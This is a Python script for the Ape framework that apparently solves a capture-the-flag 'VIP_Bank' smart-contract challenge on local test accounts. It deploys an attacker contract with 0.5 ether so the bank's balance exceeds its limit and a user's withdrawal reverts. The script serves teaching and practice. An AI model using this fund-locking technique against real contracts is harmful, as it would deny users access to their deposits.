from ape import accounts, project, networks
from ape.pytest.contextmanagers import RevertsContextManager as reverts


w3 = networks.provider.web3


def set_up():
    print("\n--- Setting up scenario ---\n")

    deployer = accounts.test_accounts[0]
    user = accounts.test_accounts[1]
    attacker = accounts.test_accounts[2]

    print("\n--- Deploying challenge contract ---\n")
    vip_bank = project.VIP_Bank.deploy(sender=deployer)

    # assert correct state of contract
    print("\n--- Ensuring the contract has the correct initial state ---\n")
    assert vip_bank.manager() == deployer.address
    assert vip_bank.maxETH() == w3.to_wei(0.5, "ether")
    vip_bank.addVIP(user.address, sender=deployer)
    assert vip_bank.VIP(user.address)
    vip_bank.deposit(sender=user, value="0.05 ether")
    assert vip_bank.balance == w3.to_wei(0.05, "ether")

    return attacker, vip_bank, user


def main():
    attacker, vip_bank, user = set_up()

    print("\n--- Running exploit... ---\n")
    project.VIP_BankAttacker.deploy(
        vip_bank.address, sender=attacker, value="0.5 ether"
    )
    assert vip_bank.balance > vip_bank.maxETH()

    # user withdraw should fail
    with reverts():
        vip_bank.withdraw(w3.to_wei(0.05, "ether"), sender=user)

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
